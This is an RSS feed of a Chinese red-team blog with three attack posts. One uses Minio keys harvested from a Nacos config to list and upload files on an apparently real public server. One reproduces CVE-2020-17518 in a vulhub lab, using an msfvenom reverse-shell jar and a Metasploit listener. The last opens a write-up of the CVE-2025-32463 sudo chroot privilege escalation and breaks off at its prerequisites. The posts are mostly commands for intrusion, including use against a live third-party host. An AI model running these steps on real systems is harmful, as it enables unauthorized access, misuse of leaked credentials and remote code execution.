<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>红队 on SlimerのBlog</title><link>http://localhost:1313/categories/%E7%BA%A2%E9%98%9F/</link><description>Recent content in 红队 on SlimerのBlog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Slimer</copyright><lastBuildDate>Wed, 15 Oct 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/categories/%E7%BA%A2%E9%98%9F/index.xml" rel="self" type="application/rss+xml"/><item><title>【Minio】云存储服务接口攻击技巧</title><link>http://localhost:1313/p/minio%E4%BA%91%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%E6%94%BB%E5%87%BB%E6%8A%80%E5%B7%A7/</link><pubDate>Wed, 15 Oct 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/minio%E4%BA%91%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%E6%94%BB%E5%87%BB%E6%8A%80%E5%B7%A7/</guid><description>&lt;img src="http://localhost:1313/images/95.webp" alt="Featured image of post 【Minio】云存储服务接口攻击技巧" />&lt;h1 id="0x00-介绍">0x00 介绍&lt;/h1>
&lt;p>Minio是一款高性能的对象存储服务，支持Amazon S3云存储服务接口。&lt;/p>
&lt;h1 id="0x01-攻击条件">0x01 攻击条件&lt;/h1>
&lt;p>当我们挖掘nacos漏洞时，使用弱口令进入到系统后，这里会有很多配置文件，这些配置文件会记录一些敏感信息。&lt;br>
敏感信息如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">rabbit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">redis
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mysql
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">minio
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ak/sk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x02-条件">0x02 条件&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015164434.png" alt="image.png">&lt;/p>
&lt;h1 id="0x03-利用">0x03 利用&lt;/h1>
&lt;p>如何利用起来呢？&lt;br>
这里就说一下minio怎么进行攻击利用。&lt;br>
首先我们需要先安装一下mc工具&lt;br>
这里我直接使用kali进行安装&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wget https://dl.min.io/client/mc/release/linux-amd64/mc
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015160937.png" alt="image.png">&lt;br>
赋予执行权限并移动到系统路径&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">chmod +x mc &lt;span class="c1"># 赋予可执行权限&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo mv mc /usr/local/bin/ &lt;span class="c1"># 移动到系统 PATH 路径，方便全局调用&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>验证安装&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mc --version
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 示例输出：mc version RELEASE.2024-05-08T17-11-57Z (commit-id=...)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>安装完成后，即可在 Kali 终端中执行你提供的命令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mc alias set my-minio http://125.34.90.154:9000 PWjVFMxxxxkakthh Lm4I01IQd5OX1xxxxx45UlascuH
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这条命令怎么来的呢？&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">set&lt;/span> &lt;span class="nx">my&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">minio：设置一个名字&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="mf">125.34&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">90.154&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">9000&lt;/span>&lt;span class="nx">：路径&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PWjVFxxxMkakthh：access&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">key&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Lm4I01IQd5OXxxxscuH：secret&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">key&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里可以看到nacos里的配置：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162657.png" alt="image.png">&lt;br>
如果所有配置正常这里会回显成功。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162848.png" alt="image.png">&lt;br>
如果配置错误这里也会显示错误提示。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162911.png" alt="image.png">&lt;br>
看一下这个里面有什么文件，可以看到这里有4个文件夹。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mc ls my-minio/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162954.png" alt="image.png">&lt;br>
然后我们先看第一个文件夹里面有什么数据：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mc ls my-minio/solicitation
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163102.png" alt="image.png">&lt;br>
然后再随便跟一个文件夹，看一下有什么东西没：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163147.png" alt="image.png">&lt;br>
可以看到有一个1.png文件。&lt;br>
然后直接访问这个路径，记得把my-minio删掉，发现可以直接显示图片。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163244.png" alt="image.png">&lt;br>
然后我们尝试是否能文件上传到桶里面：&lt;br>
首先创建一个文件。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163414.png" alt="image.png">&lt;br>
上传恶意文件&lt;br>
这里你可以随便上传到哪里，反正有目录了。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mc cp test.php my-minio/solicitation/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163558.png" alt="image.png">&lt;br>
可以看到已经上传成功了。&lt;br>
访问一下这个路径，&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">solicitation/test.php
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163649.png" alt="image.png">&lt;br>
发现直接下载，并没有解析。&lt;br>
删除&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mc rm --force test.php
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163856.png" alt="image.png">&lt;/p>
&lt;h1 id="0x04-绕过技巧">0x04 绕过技巧&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">SERVER_TIME=$(curl -s -I &amp;#34;[http://127.0.0.1:9000&amp;#34;](http://125.34.90.154:9000/&amp;#34;) | grep -i &amp;#34;date:&amp;#34; | cut -d&amp;#39;:&amp;#39; -f2- | sed &amp;#39;s/^ *//&amp;#39;); sudo date -s &amp;#34;$SERVER_TIME&amp;#34; &amp;amp;&amp;amp; ./mc ls my-minio/solicitation
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">这个命令主要是绕过/mc ls my-minio/solicitation可以在这个地方添加命令。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">如果你仔细的情况下可以观察到：SERVER_TIME=$(curl -s -I &amp;#34;[http://127.0.0.1:9000&amp;#34;](http://125.34.90.154:9000/&amp;#34;) | grep -i &amp;#34;date:&amp;#34; | cut -d&amp;#39;:&amp;#39; -f2- | sed &amp;#39;s/^ *//&amp;#39;); sudo date -s &amp;#34;$SERVER_TIME&amp;#34; 前面无论如何都是这种命令，因为帮助我们绕过，后面只需跟&amp;amp;&amp;amp; 然后mc基础命令即可。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015164235.png" alt="image.png">&lt;/p></description></item><item><title>【CVE-2020-17518】Apache Flink任意文件上传漏洞复现</title><link>http://localhost:1313/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link><pubDate>Tue, 14 Oct 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid><description>&lt;img src="http://localhost:1313/images/94.webp" alt="Featured image of post 【CVE-2020-17518】Apache Flink任意文件上传漏洞复现" />&lt;h1 id="0x00-漏洞描述">0x00 漏洞描述&lt;/h1>
&lt;p>Apache &lt;a href="https://so.csdn.net/so/search?q=Flink&amp;amp;spm=1001.2101.3001.7020">Flink&lt;/a> 是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。&lt;br>
编号：CVE-2020-17518&lt;br>
Flink 1.5.1引入了REST API，但其实现上存在多处缺陷，导致目录遍历和任意文件写入漏洞。&lt;/p>
&lt;h1 id="0x01-影响范围">0x01 影响范围&lt;/h1>
&lt;p>Apache Flink 1.5.1 ~ 1.11.2&lt;/p>
&lt;h1 id="0x02-环境搭建">0x02 环境搭建&lt;/h1>
&lt;p>启动vulhub_kali_linux&lt;br>
进入vulhub靶场已经给CVE-2020-17518搭建好的环境&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub/flink/CVE-2020-17518
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>使用docker启动flink环境&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>环境启动后,本机访问&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.137:8081
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014162842.png" alt="image.png">&lt;/p>
&lt;h1 id="0x03-漏洞复现">0x03 漏洞复现&lt;/h1>
&lt;p>上传任意文件,进行bp抓包&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014162952.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014163008.png" alt="image.png">&lt;br>
在filename字段值修改为jar后缀名 ,发送请求,回显的状态码200以及参数说明上传成功&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014163049.png" alt="image.png">&lt;br>
回显的信息发现上传文件的位置:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">flink&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">web&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">fc404e92&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">f1db&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4258&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">923e-10&lt;/span>&lt;span class="n">f2199225eb&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">flink&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">web&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">upload&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x04-漏洞利用">0x04 漏洞利用&lt;/h1>
&lt;p>使用kali的msfvenom工具,生成文件的目录自定义&lt;br>
lhost为kali_linux的IP地址   lport为kali_linux的端口  &amp;gt;后面为文件路径以及文件名&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">msfvenom -p java/shell_reverse_tcp lhost=192.168.197.129 lport=1314 -f jar &amp;gt;/home/slimer/桌面/2.jar
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014164618.png" alt="image.png">&lt;br>
启动msf监听&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">msfconsole&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">设置监听模块&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">exploit&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">multi&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">handler&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">设置&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">java&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">shell_reverse_tcp&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">设置监听&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IP&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">地址&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">lhost&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">192&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">197&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">129&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">设置监听端口&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">lport&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">1314&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">执行&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014165222.png" alt="image.png">&lt;br>
上传&lt;code>2.jar&lt;/code>文件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014165011.png" alt="image.png">&lt;br>
成功监听：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014164932.png" alt="image.png">&lt;/p>
&lt;h1 id="0x05-漏洞检测">0x05 漏洞检测&lt;/h1>
&lt;p>可以通过分析apache日志来检测攻击。&lt;/p>
&lt;h1 id="0x06-漏洞修复">0x06 漏洞修复&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">官方已发布安全版本，请及时下载升级至安全版本。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">flink&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">apache&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">org&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">zh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">downloads&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">html&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【CVE-2025-32463】Linux sudo chroot 本地提权</title><link>http://localhost:1313/p/cve-2025-32463linux-sudo-chroot-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</link><pubDate>Fri, 10 Oct 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/cve-2025-32463linux-sudo-chroot-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</guid><description>&lt;img src="http://localhost:1313/images/91.webp" alt="Featured image of post 【CVE-2025-32463】Linux sudo chroot 本地提权" />&lt;h1 id="0x01-简介">0x01 简介&lt;/h1>
&lt;p>&lt;code>sudo chroot&lt;/code>是 Linux 系统中一个强大的命令组合，用于以超级用户权限切换到一个指定的目录，并将其作为新的根目录运行命令或启动会话。&lt;code>sudo&lt;/code>用于获取管理员权限，而 &lt;code>chroot&lt;/code>（change root）则会将指定目录设置为新的根目录，从而创建一个隔离的环境。这种组合常用于系统维护、软件测试和安全隔离等场景。例如，在修复系统问题时，可以通过 &lt;code>sudo chroot&lt;/code>进入一个隔离的环境，避免对主系统造成进一步影响；在软件测试中，可以限制测试环境的范围，防止潜在的系统级问题。通过这种方式，&lt;code>sudo chroot&lt;/code>提供了一种灵活且安全的方式来管理和操作 Linux 系统。&lt;/p>
&lt;h1 id="0x02-漏洞描述">0x02 漏洞描述&lt;/h1>
&lt;p>&lt;strong>漏洞编号：CVE-2025-32463&lt;/strong>&lt;br>
这是一个严重的本地提权漏洞，该漏洞 CVSS 评分为 7.8，属于高危漏洞。该漏洞允许本地低权限用户通过特制的恶意 &lt;code>chroot&lt;/code>环境触发动态库加载，从而以 root 权限执行任意代码。攻击者可以利用 &lt;code>sudo&lt;/code>的 &lt;code>-R&lt;/code>（即 &lt;code>--chroot&lt;/code>）选项，诱骗 &lt;code>sudo&lt;/code>使用用户指定的根目录加载恶意共享库。问题根源在于 &lt;code>sudo&lt;/code>在读取 &lt;code>sudoers&lt;/code>配置文件之前，就开始在用户控制的 &lt;code>chroot&lt;/code>环境中解析路径。&lt;/p>
&lt;h1 id="0x03-利用条件">0x03 利用条件&lt;/h1>
&lt;h2 id="1-影响版本">1) 影响版本&lt;/h2>
&lt;p>&lt;code>sudo --version&lt;/code>若输出的版本信息在 1.9.14 至 1.9.17 之间&lt;br>
1.9.14 &amp;lt;= sudo &amp;lt;= 1.9.17&lt;br>
1.8 系列及更早版本不受影响，因为它们不包含 chroot 功能。 在特定配置或发行版中，即使该版本早于官方公告，潜在的不安全行为仍可能被利用。&lt;/p>
&lt;h2 id="2-权限要求">2) 权限要求&lt;/h2>
&lt;p>普通用户&lt;/p>
&lt;h2 id="3-其他条件">3) 其他条件&lt;/h2>
&lt;p>&lt;code>sudo&lt;/code>版本要能使用 &lt;code>--chroot&lt;/code>功能&lt;/p>
